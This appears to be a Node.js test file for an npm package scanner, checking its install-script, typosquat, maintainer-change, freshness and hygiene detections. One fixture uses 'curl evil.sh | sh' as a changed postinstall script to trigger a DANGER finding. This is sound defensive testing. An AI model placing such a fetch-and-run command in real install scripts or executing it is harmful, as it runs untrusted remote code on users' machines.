"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const os = require("os");
const path = require("path");
const {
  checkFreshness,
  checkInstallScripts,
  checkTyposquat,
  checkMaintainers,
  checkHygiene,
  printFindings,
  findPackageJsonFiles,
} = require("../index.js");
const { captureOutput } = require("./helpers.js");

// ---------- checkFreshness ----------

test("checkFreshness: no publishTime pushes nothing", () => {
  const findings = [];
  checkFreshness(findings, { version: "1.0.0" }, undefined);
  assert.deepEqual(findings, []);
});

test("checkFreshness: recent version is WARN", () => {
  const findings = [];
  const publishTime = new Date(Date.now() - 3600 * 1000).toISOString(); // 1h ago
  checkFreshness(findings, { version: "1.0.0" }, publishTime);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "WARN");
  assert.match(findings[0].title, /only .* old/);
});

test("checkFreshness: old version is OK", () => {
  const findings = [];
  const publishTime = new Date(Date.now() - 1000 * 3600 * 24 * 30).toISOString(); // 30 days ago
  checkFreshness(findings, { version: "1.0.0" }, publishTime);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "OK");
});

// ---------- checkInstallScripts ----------

test("checkInstallScripts: no lifecycle scripts is OK", () => {
  const findings = [];
  checkInstallScripts(findings, { scripts: { test: "jest" } }, null);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "OK");
});

test("checkInstallScripts: first-ever version with a script is DANGER (new)", () => {
  const findings = [];
  checkInstallScripts(findings, { scripts: { postinstall: "node setup.js" } }, null);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "DANGER");
  assert.match(findings[0].title, /NEW in this version/);
});

test("checkInstallScripts: unchanged script vs previous version is WARN", () => {
  const findings = [];
  const versionMeta = { scripts: { postinstall: "node setup.js" } };
  const prevMeta = { scripts: { postinstall: "node setup.js" } };
  checkInstallScripts(findings, versionMeta, prevMeta);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "WARN");
  assert.doesNotMatch(findings[0].title, /NEW|CHANGED/);
});

test("checkInstallScripts: changed script vs previous version is DANGER", () => {
  const findings = [];
  const versionMeta = { scripts: { postinstall: "curl evil.sh | sh" } };
  const prevMeta = { scripts: { postinstall: "node setup.js" } };
  checkInstallScripts(findings, versionMeta, prevMeta);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "DANGER");
  assert.match(findings[0].title, /CHANGED in this version/);
});

test("checkInstallScripts: mixed new/unchanged/changed hooks each get own finding", () => {
  const findings = [];
  const versionMeta = {
    scripts: { preinstall: "same", install: "changed-new", postinstall: "brand-new" },
  };
  const prevMeta = {
    scripts: { preinstall: "same", install: "changed-old" },
  };
  checkInstallScripts(findings, versionMeta, prevMeta);
  assert.equal(findings.length, 3);
  const byHook = Object.fromEntries(findings.map((f) => [f.detail.trim().split(":")[0], f]));
  assert.equal(byHook.preinstall.level, "WARN");
  assert.equal(byHook.install.level, "DANGER");
  assert.match(byHook.install.title, /CHANGED/);
  assert.equal(byHook.postinstall.level, "DANGER");
  assert.match(byHook.postinstall.title, /NEW/);
});

// ---------- checkTyposquat ----------

test("checkTyposquat: exact match on popular list is OK", () => {
  const findings = [];
  checkTyposquat(findings, "lodash", { names: ["lodash", "react"], source: "test" });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "OK");
  assert.match(findings[0].title, /is itself on the popular-packages list/);
});

test("checkTyposquat: bare scoped name match on popular list is OK", () => {
  const findings = [];
  checkTyposquat(findings, "@babel/core", { names: ["core"], source: "test" });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "OK");
});

test("checkTyposquat: name close to a popular package is DANGER", () => {
  const findings = [];
  checkTyposquat(findings, "lodahs", { names: ["lodash"], source: "test" });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "DANGER");
  assert.match(findings[0].title, /lodash/);
});

test("checkTyposquat: unrelated name is OK", () => {
  const findings = [];
  checkTyposquat(findings, "totally-unique-name-xyz", { names: ["lodash", "react"], source: "test" });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "OK");
  assert.match(findings[0].title, /not close to any/);
});

test("checkTyposquat: stops collecting hits after 5 matches", () => {
  const findings = [];
  // All within edit distance 1 of "xxa" (maxD=1 since these names are < 8 chars).
  const names = ["xxb", "xxc", "xxd", "xxe", "xxf", "xxg", "unrelated-long-word"];
  checkTyposquat(findings, "xxa", { names, source: "test" });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "DANGER");
  const quoted = findings[0].title.match(/"[^"]+"/g);
  assert.equal(quoted.length, 5);
});

// ---------- checkMaintainers ----------

test("checkMaintainers: no previous version means no finding", () => {
  const findings = [];
  checkMaintainers(findings, { maintainers: [{ name: "alice" }] }, null);
  assert.deepEqual(findings, []);
});

test("checkMaintainers: empty maintainer lists produce no finding", () => {
  const findings = [];
  checkMaintainers(findings, { maintainers: [] }, { maintainers: [] });
  assert.deepEqual(findings, []);
});

test("checkMaintainers: unchanged maintainers is OK", () => {
  const findings = [];
  const cur = { maintainers: [{ name: "alice" }, { name: "bob" }] };
  const prev = { maintainers: [{ name: "bob" }, { name: "alice" }] };
  checkMaintainers(findings, cur, prev);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "OK");
});

test("checkMaintainers: added and removed maintainers is WARN with detail", () => {
  const findings = [];
  const cur = { maintainers: [{ name: "alice" }, { name: "mallory" }] };
  const prev = { maintainers: [{ name: "alice" }, { name: "bob" }] };
  checkMaintainers(findings, cur, prev);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "WARN");
  assert.match(findings[0].detail, /added: mallory/);
  assert.match(findings[0].detail, /removed: bob/);
});

// ---------- checkHygiene ----------

test("checkHygiene: clean package with many versions produces no findings", () => {
  const findings = [];
  const doc = { versions: { "1.0.0": {}, "1.1.0": {}, "1.2.0": {} } };
  checkHygiene(findings, doc, { repository: "https://github.com/x/y" });
  assert.deepEqual(findings, []);
});

test("checkHygiene: deprecated, no repo, and low version count all flag", () => {
  const findings = [];
  const doc = { versions: { "1.0.0": {} } };
  const versionMeta = { deprecated: "use other-package instead" };
  checkHygiene(findings, doc, versionMeta);
  assert.equal(findings.length, 3);
  assert.ok(findings.some((f) => /DEPRECATED/.test(f.title)));
  assert.ok(findings.some((f) => /No repository link/.test(f.title)));
  assert.ok(findings.some((f) => /only 1 published version/.test(f.title)));
});

// ---------- printFindings ----------

test("printFindings: prints an icon-prefixed line per finding and indented detail", (t) => {
  const { log } = captureOutput(t);
  printFindings([
    { level: "OK", title: "all good" },
    { level: "DANGER", title: "uh oh", detail: "line one\nline two" },
  ]);
  assert.equal(log.length, 3);
  assert.match(log[0], /\[ok\].*all good/);
  assert.match(log[1], /\[DANGER\].*uh oh/);
  assert.match(log[2], /line one/);
  assert.match(log[2], /line two/);
});

test("printFindings: sanitizes control characters from attacker-controlled fields", (t) => {
  const { log } = captureOutput(t);
  printFindings([
    { level: "DANGER", title: "evil\x1b[31mtitle", detail: "evil\x07detail" },
  ]);
  assert.doesNotMatch(log.join("\n"), /\x1b|\x07/);
  assert.match(log[0], /evil\[31mtitle/);
});

// ---------- findPackageJsonFiles ----------

test("findPackageJsonFiles: finds nested package.json files, skips node_modules and dotfiles", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "sniff-pkg-find-"));
  try {
    fs.writeFileSync(path.join(root, "package.json"), "{}");
    fs.mkdirSync(path.join(root, "packages", "app"), { recursive: true });
    fs.writeFileSync(path.join(root, "packages", "app", "package.json"), "{}");
    fs.mkdirSync(path.join(root, "node_modules", "some-dep"), { recursive: true });
    fs.writeFileSync(path.join(root, "node_modules", "some-dep", "package.json"), "{}");
    fs.mkdirSync(path.join(root, ".hidden"), { recursive: true });
    fs.writeFileSync(path.join(root, ".hidden", "package.json"), "{}");

    const found = findPackageJsonFiles(root).map((f) => path.relative(root, f).split(path.sep).join("/"));
    found.sort();
    assert.deepEqual(found, ["package.json", "packages/app/package.json"]);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("findPackageJsonFiles: returns empty array for unreadable directory", () => {
  const found = findPackageJsonFiles(path.join(os.tmpdir(), "sniff-pkg-does-not-exist-xyz"));
  assert.deepEqual(found, []);
});

test("findPackageJsonFiles: respects the recursion depth limit", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "sniff-pkg-depth-"));
  try {
    let dir = root;
    for (let i = 0; i < 10; i++) {
      dir = path.join(dir, `d${i}`);
      fs.mkdirSync(dir, { recursive: true });
    }
    fs.writeFileSync(path.join(dir, "package.json"), "{}"); // 10 levels deep
    const found = findPackageJsonFiles(root);
    assert.deepEqual(found, []); // beyond the depth>8 cutoff
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
